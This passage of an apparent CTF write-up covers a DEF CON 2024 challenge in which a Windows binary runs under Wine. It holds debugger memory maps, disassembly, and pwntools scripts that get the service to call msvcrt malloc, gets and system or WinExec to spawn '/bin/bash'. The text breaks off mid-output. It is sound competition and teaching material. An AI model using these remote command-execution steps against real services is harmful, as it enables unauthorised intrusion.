</span></span><span style="display:flex;"><span>    0x79971d95b000     0x79971d95c000 r--p     <span style="color:#ae81ff">1000</span>      <span style="color:#ae81ff">0</span> /usr/lib/x86_64-linux-gnu/libdl.so.2
</span></span><span style="display:flex;"><span>    0x79971d95c000     0x79971d95d000 r-xp     <span style="color:#ae81ff">1000</span>   <span style="color:#ae81ff">1000</span> /usr/lib/x86_64-linux-gnu/libdl.so.2
</span></span><span style="display:flex;"><span>    0x79971d95d000     0x79971d95e000 r--p     <span style="color:#ae81ff">1000</span>   <span style="color:#ae81ff">2000</span> /usr/lib/x86_64-linux-gnu/libdl.so.2
</span></span><span style="display:flex;"><span>    0x79971d95e000     0x79971d95f000 r--p     <span style="color:#ae81ff">1000</span>   <span style="color:#ae81ff">2000</span> /usr/lib/x86_64-linux-gnu/libdl.so.2
</span></span><span style="display:flex;"><span>    0x79971d95f000     0x79971d960000 rw-p     <span style="color:#ae81ff">1000</span>   <span style="color:#ae81ff">3000</span> /usr/lib/x86_64-linux-gnu/libdl.so.2
</span></span><span style="display:flex;"><span>    0x79971d960000     0x79971d961000 r--p     <span style="color:#ae81ff">1000</span>      <span style="color:#ae81ff">0</span> /usr/lib/x86_64-linux-gnu/libpthread.so.0
</span></span><span style="display:flex;"><span>    0x79971d961000     0x79971d962000 r-xp     <span style="color:#ae81ff">1000</span>   <span style="color:#ae81ff">1000</span> /usr/lib/x86_64-linux-gnu/libpthread.so.0
</span></span><span style="display:flex;"><span>    0x79971d962000     0x79971d963000 r--p     <span style="color:#ae81ff">1000</span>   <span style="color:#ae81ff">2000</span> /usr/lib/x86_64-linux-gnu/libpthread.so.0
</span></span><span style="display:flex;"><span>    0x79971d963000     0x79971d964000 r--p     <span style="color:#ae81ff">1000</span>   <span style="color:#ae81ff">2000</span> /usr/lib/x86_64-linux-gnu/libpthread.so.0
</span></span><span style="display:flex;"><span>    0x79971d964000     0x79971d965000 rw-p     <span style="color:#ae81ff">1000</span>   <span style="color:#ae81ff">3000</span> /usr/lib/x86_64-linux-gnu/libpthread.so.0
</span></span><span style="display:flex;"><span>    0x79971d978000     0x79971d97a000 rw-p     <span style="color:#ae81ff">2000</span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_79971d978<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    0x79971d97a000     0x79971d97c000 r--p     <span style="color:#ae81ff">2000</span>      <span style="color:#ae81ff">0</span> /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
</span></span><span style="display:flex;"><span>    0x79971d97c000     0x79971d9a6000 r-xp    2a000   <span style="color:#ae81ff">2000</span> /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
</span></span><span style="display:flex;"><span>    0x79971d9a6000     0x79971d9b1000 r--p     b000  2c000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
</span></span><span style="display:flex;"><span>    0x79971d9b1000     0x79971d9b2000 ---p     <span style="color:#ae81ff">1000</span>  <span style="color:#ae81ff">37000</span> /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
</span></span><span style="display:flex;"><span>    0x79971d9b2000     0x79971d9b4000 r--p     <span style="color:#ae81ff">2000</span>  <span style="color:#ae81ff">37000</span> /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
</span></span><span style="display:flex;"><span>    0x79971d9b4000     0x79971d9b6000 rw-p     <span style="color:#ae81ff">2000</span>  <span style="color:#ae81ff">39000</span> /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
</span></span><span style="display:flex;"><span>    0x79971d9b6000     0x79971d9b7000 r--p     <span style="color:#ae81ff">1000</span>      <span style="color:#ae81ff">0</span> /opt/wine-stable/bin/wine64
</span></span><span style="display:flex;"><span>    0x79971d9b7000     0x79971d9b8000 r-xp     <span style="color:#ae81ff">1000</span>   <span style="color:#ae81ff">1000</span> /opt/wine-stable/bin/wine64
</span></span><span style="display:flex;"><span>    0x79971d9b8000     0x79971d9b9000 r--p     <span style="color:#ae81ff">1000</span>   <span style="color:#ae81ff">2000</span> /opt/wine-stable/bin/wine64
</span></span><span style="display:flex;"><span>    0x79971d9b9000     0x79971d9ba000 r--p     <span style="color:#ae81ff">1000</span>   <span style="color:#ae81ff">2000</span> /opt/wine-stable/bin/wine64
</span></span><span style="display:flex;"><span>    0x79971d9ba000     0x79971d9bb000 rw-p     <span style="color:#ae81ff">1000</span>   <span style="color:#ae81ff">3000</span> /opt/wine-stable/bin/wine64
</span></span><span style="display:flex;"><span>    0x79971d9bb000     0x79971d9bc000 r--p     <span style="color:#ae81ff">1000</span>      <span style="color:#ae81ff">0</span> /opt/wine-stable/bin/wine64-preloader
</span></span><span style="display:flex;"><span>    0x79971d9bc000     0x79971d9be000 r-xp     <span style="color:#ae81ff">2000</span>   <span style="color:#ae81ff">1000</span> /opt/wine-stable/bin/wine64-preloader
</span></span><span style="display:flex;"><span>    0x79971d9be000     0x79971d9bf000 r--p     <span style="color:#ae81ff">1000</span>   <span style="color:#ae81ff">3000</span> /opt/wine-stable/bin/wine64-preloader
</span></span><span style="display:flex;"><span>    0x79971d9bf000     0x79971d9c1000 rw-p     <span style="color:#ae81ff">2000</span>   <span style="color:#ae81ff">3000</span> /opt/wine-stable/bin/wine64-preloader
</span></span><span style="display:flex;"><span>    0x7ffc5b674000     0x7ffc5b695000 rw-p    <span style="color:#ae81ff">21000</span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>stack<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    0x7ffc5b749000     0x7ffc5b74d000 r--p     <span style="color:#ae81ff">4000</span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>vvar<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    0x7ffc5b74d000     0x7ffc5b74f000 r-xp     <span style="color:#ae81ff">2000</span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>vdso<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    0x7ffffe000000     0x7ffffe100000 rw-p   <span style="color:#ae81ff">100000</span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_7ffffe000<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    0x7ffffe100000     0x7ffffe102000 ---p     <span style="color:#ae81ff">2000</span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_7ffffe100<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    0x7ffffe102000     0x7ffffe300000 rw-p   1fe000      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_7ffffe102<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    0x7ffffe300000     0x7ffffe311000 r--p    <span style="color:#ae81ff">11000</span>      <span style="color:#ae81ff">0</span> /opt/wine-stable/lib64/wine/x86_64-windows/apisetschema.dll
</span></span><span style="display:flex;"><span>    0x7ffffe311000     0x7ffffe320000 ---p     f000      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_7ffffe311<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    0x7ffffe320000     0x7ffffe33a000 rw-p    1a000      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_7ffffe320<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    0x7ffffe33a000     0x7ffffe340000 ---p     <span style="color:#ae81ff">6000</span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_7ffffe33a<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    0x7ffffe340000     0x7ffffe3fa000 r--p    ba000      <span style="color:#ae81ff">0</span> /opt/wine-stable/share/wine/nls/locale.nls
</span></span><span style="display:flex;"><span>    0x7ffffe3fa000     0x7ffffe400000 ---p     <span style="color:#ae81ff">6000</span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_7ffffe3fa<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    0x7ffffe400000     0x7ffffe402000 r--p     <span style="color:#ae81ff">2000</span>      <span style="color:#ae81ff">0</span> /opt/wine-stable/share/wine/nls/l_intl.nls
</span></span><span style="display:flex;"><span>    0x7ffffe402000     0x7ffffe410000 ---p     e000      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_7ffffe402<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    0x7ffffe410000     0x7ffffe421000 r--p    <span style="color:#ae81ff">11000</span>      <span style="color:#ae81ff">0</span> /opt/wine-stable/share/wine/nls/c_1252.nls
</span></span><span style="display:flex;"><span>    0x7ffffe421000     0x7ffffe430000 ---p     f000      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_7ffffe421<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    0x7ffffe430000     0x7ffffe441000 r--p    <span style="color:#ae81ff">11000</span>      <span style="color:#ae81ff">0</span> /opt/wine-stable/share/wine/nls/c_437.nls
</span></span><span style="display:flex;"><span>    0x7ffffe441000     0x7ffffe450000 ---p     f000      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_7ffffe441<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    0x7ffffe450000     0x7ffffe550000 rw-p   <span style="color:#ae81ff">100000</span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_7ffffe450<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    0x7ffffe550000     0x7ffffe889000 r--p   <span style="color:#ae81ff">339000</span>      <span style="color:#ae81ff">0</span> /opt/wine-stable/share/wine/nls/sortdefault.nls
</span></span><span style="display:flex;"><span>    0x7ffffe889000     0x7ffffe890000 ---p     <span style="color:#ae81ff">7000</span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_7ffffe889<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    0x7ffffe890000     0x7ffffe89f000 r--p     f000      <span style="color:#ae81ff">0</span> /opt/wine-stable/share/wine/nls/normnfc.nls
</span></span><span style="display:flex;"><span>    0x7ffffe89f000     0x7ffffe8a0000 ---p     <span style="color:#ae81ff">1000</span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_7ffffe89f<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    0x7ffffe8a0000     0x7ffffe8ba000 rw-p    1a000      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_7ffffe8a0<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    0x7ffffe8ba000     0x7ffffe8c0000 ---p     <span style="color:#ae81ff">6000</span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_7ffffe8ba<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    0x7ffffe8c0000     0x7ffffe8d1000 r--p    <span style="color:#ae81ff">11000</span>      <span style="color:#ae81ff">0</span> /opt/wine-stable/share/wine/nls/c_20127.nls
</span></span><span style="display:flex;"><span>    0x7ffffe8d1000     0x7fffffdb0000 ---p  14df000      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_7ffffe8d1<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    0x7fffffdb0000     0x7fffffff0000 rw-p   <span style="color:#ae81ff">240000</span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_7fffffdb0<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>0xffffffffff600000 0xffffffffff601000 --xp     <span style="color:#ae81ff">1000</span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>vsyscall<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>pwndbg&gt; 
</span></span></code></pre></div><p>And here is the output we got:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>╭─<span style="color:#f92672">[</span>nvm<span style="color:#f92672">]</span> as kyrie in ~/CTF/2024/defcon/durnk/handout                                                                                                           17:33:31
</span></span><span style="display:flex;"><span>╰──➤ wine test.exe
</span></span><span style="display:flex;"><span>WinMain:                00000001400015a1
</span></span><span style="display:flex;"><span>kernel32.dll:           00006fffffa80000
</span></span><span style="display:flex;"><span>GetProcAddress:         00006fffffa98a60
</span></span><span style="display:flex;"><span>msvcrt.dll:             000000007bb50000
</span></span><span style="display:flex;"><span>ntdll.dll:              00006fffffc50000
</span></span><span style="display:flex;"><span>Stack:                  00007ffffe2ffe4c
</span></span><span style="display:flex;"><span>Heap:                   00007ffffe8a0c70
</span></span></code></pre></div><p>There are a few things to notice:</p>
<ul>
<li>No readable/writable/executable (rwx) memory</li>
<li>The windows executable (challenge.exe) with its sections is mapped beginning at 0x140000000</li>
<li>There are many libraries expected in a standard linux process</li>
<li>There are other libraries you do not expect at all on a linux system, like kernel32.dll, ntdll.dll, msvcrt.dll and ntdll.so</li>
<li>The Heap and The Stack quite close</li>
<li>There is a region marked as stack (at 0x7ffc5b674000), but it’s different from the stack used by the application (the printdata output was 0x7ffffe2ffe4c)</li>
<li>Same goes for the heap: gdb sees one at 0x5555562bb000 , but the application uses a different heap beginning at 0x7ffffe8a0c70</li>
</ul>
<pre tabindex="0"><code>pwndbg&gt; x/2i 0x7ffff7d147e2
   0x7ffff7d147e2 &lt;__GI___libc_read+18&gt;:        cmp    rax,0xfffffffffffff000
   0x7ffff7d147e8 &lt;__GI___libc_read+24&gt;:        ja     0x7ffff7d14840 &lt;__GI___libc_read+112&gt;
</code></pre><p>The most important thing is that the <code>__GI___libc_read</code> function, as we would expect in a regular Linux process waits for some input (via getchar()).</p>
<p>If you restart the process and look at it again, you will see that the all libraries are mapped to different addresses each time, while the addresses of the &lsquo;msvcrt.dll&rsquo; libraries mostly remain the same.</p>
<p>When it call to <code>LoadLibrary</code> to get the base address of module <code>msvcrt.dll</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>    HMODULE msvcrt <span style="color:#f92672">=</span> <span style="color:#a6e22e">LoadLibrary</span>(<span style="color:#e6db74">&#34;msvcrt.dll&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;msvcrt.dll:</span><span style="color:#ae81ff">\t\t</span><span style="color:#e6db74">%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,msvcrt);    
</span></span></code></pre></div><p>In gdb, <code>msvcrt.dll</code> is passed to <code>rcx</code> register while <code>rax</code> store the address of <code>LoadLibrary</code> function</p>
<pre tabindex="0"><code>─────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────────────
   0x7bb74ae6     add    rsp, 0x20     RSP =&gt; 0x7ffffe2ffe10 (0x7ffffe2ffdf0 + 0x20)
   0x7bb74aea     pop    r12           R12 =&gt; 16
   0x7bb74aec     ret                                &lt;0x14000160e&gt;
    ↓
   0x14000160e    lea    rcx, [rip + 0x7a2e]               RCX =&gt; 0x140009043 ◂— &#39;msvcrt.dll&#39;
   0x140001615    mov    rax, qword ptr [rip + 0xbc10]     RAX, [0x14000d22c] =&gt; 0x6fffffa8ea14 ◂— lea rsp, [rsp]
 ► 0x14000161c    call   rax                         &lt;0x6fffffa8ea14&gt;
</code></pre><p>Finally, let&rsquo;s get our hands dirty.</p>
<h2 id="source-code-overview-3">Source-code overview</h2>
<p><img src="https://imgur.com/4rgNU3q.png" alt="image"></p>
<p>First, it uses the DLL specified by us to call the LoadLibraryA function.</p>
<p><img src="https://imgur.com/PpxMeux.png" alt="image"></p>
<p>Respond to us with the resulting module handle. Using the API name specified on the client side and the module handle in the result of step 1, call the GetProcAddress function on the server side to get the function address</p>
<p><img src="https://imgur.com/CVlVrYr.png" alt="image"></p>
<p>Finally, using the 64-bit integer specified by the client side as an argument, the function address of the result of step 2 is called on the server side. Returns the result of the call to the client.</p>
<p>Note that the distribution file also includes <code>kernel32.dll</code> and <code>msvcrt.dll</code>.</p>
<h2 id="solution-2">Solution</h2>
<h3 id="method-1">Method 1</h3>
<ol>
<li>I call the malloc function of msvcrt.dll with an appropriate size as an argument to allocate memory and obtain the address.</li>
<li>I call the gets function of msvcrt.dll with the address in step 1 as an argument, then enter the command &lsquo;/bin/bash&rsquo; =))</li>
<li>Call &lsquo;WinExec&rsquo; and pass the address of the string as an argument, and we get a shell.</li>
</ol>
<p><img src="https://imgur.com/QNOdSBQ.png" alt="image"></p>
<p>I founded that <code>/root/.wine/dosdevices/z:</code> is just a symlink to <code>/</code></p>
<p><img src="https://imgur.com/JAQqaBa.png" alt="image"></p>
<p>Since the original <a href="https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-winexec">WinExec</a> function is a function that takes two arguments, it seems that an indefinite value will be entered in the second argument uCmdShow in this execution method. However, it may be that the uCmdShow argument is a value that does not affect CUI programs.</p>
<p><img src="https://imgur.com/GAKJAea.png" alt="image"></p>
<h3 id="method-2">Method 2</h3>
<p>In this way, I do the same as above, but instead of calling the WinExec function, I call the system function of the module msvcrt.dll</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>HOST <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;0&#34;</span>
</span></span><span style="display:flex;"><span>PORT <span style="color:#f92672">=</span> <span style="color:#ae81ff">1337</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>LOCAL:
</span></span><span style="display:flex;"><span>    io <span style="color:#f92672">=</span> process([<span style="color:#e6db74">&#34;wine&#34;</span>, <span style="color:#e6db74">&#34;challenge.exe&#34;</span>])
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>    io <span style="color:#f92672">=</span> remote(HOST, int(PORT))
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;msvcrt.dll&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;malloc&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(str(<span style="color:#ae81ff">0x100</span>)<span style="color:#f92672">.</span>encode()) 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Result: &#39;</span>)
</span></span><span style="display:flex;"><span>out <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>)<span style="color:#f92672">.</span>strip()
</span></span><span style="display:flex;"><span>print(out)
</span></span><span style="display:flex;"><span>heap_addr <span style="color:#f92672">=</span> int(out<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;: &#39;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>],<span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>print(hex(heap_addr))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;msvcrt.dll&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;gets&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(str(heap_addr)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/bash&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;msvcrt.dll&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;puts&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(str(heap_addr)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;msvcrt.dll&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;system&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(str(heap_addr)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><p>But when running, it failed and returned -1, I don&rsquo;t know why it happened.</p>
<blockquote>
<p>If command is NULL and the command interpreter is found, returns a nonzero value. If the command interpreter isn&rsquo;t found, returns 0 and sets errno to ENOENT. If command isn&rsquo;t NULL, system returns the value that is returned by the command interpreter. It returns the value 0 only if the command interpreter returns the value 0. A return value of -1 indicates an error, and errno is set to one of the following values:</p>
</blockquote>
<p>According to Microsoft&rsquo;s system function documentation, if calling the system function results in an error, it returns -1 and sets the error code to the global variable <code>errno</code>.</p>
<p>So I leveraged the <a href="https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/get-errno?view=msvc-170">_get_errno</a> function to to get the current value of the errno global variable.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>HOST <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;0&#34;</span>
</span></span><span style="display:flex;"><span>PORT <span style="color:#f92672">=</span> <span style="color:#ae81ff">1337</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>LOCAL:
</span></span><span style="display:flex;"><span>    io <span style="color:#f92672">=</span> process([<span style="color:#e6db74">&#34;wine&#34;</span>, <span style="color:#e6db74">&#34;challenge.exe&#34;</span>])
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>    io <span style="color:#f92672">=</span> remote(HOST, int(PORT))
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;msvcrt.dll&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;malloc&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(str(<span style="color:#ae81ff">0x100</span>)<span style="color:#f92672">.</span>encode()) 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Result: &#39;</span>)
</span></span><span style="display:flex;"><span>out <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>)<span style="color:#f92672">.</span>strip()
</span></span><span style="display:flex;"><span>heap_addr <span style="color:#f92672">=</span> int(out<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;: &#39;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>],<span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>print(hex(heap_addr))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;msvcrt.dll&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;gets&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(str(heap_addr)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/bash</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;msvcrt.dll&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;puts&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(str(heap_addr)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;msvcrt.dll&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;system&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(str(heap_addr)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sleep(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;msvcrt.dll&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;malloc&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(str(<span style="color:#ae81ff">0x100</span>)<span style="color:#f92672">.</span>encode()) 
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Result: &#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Result: &#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Result: &#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Result: &#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>out <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>)<span style="color:#f92672">.</span>strip()
</span></span><span style="display:flex;"><span>print(out)
</span></span><span style="display:flex;"><span>errno_ <span style="color:#f92672">=</span> int(out<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;: &#39;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>],<span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>print(hex(errno_))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;msvcrt.dll&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;_get_errno&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(str(errno_)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;msvcrt.dll&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;puts&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(str(errno_)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(io<span style="color:#f92672">.</span>recvline())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><p>Run this lead us know the value of errno variable is 2.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>b<span style="color:#e6db74">&#34;Alright, we&#39;re calling it!\r\n&#34;</span>
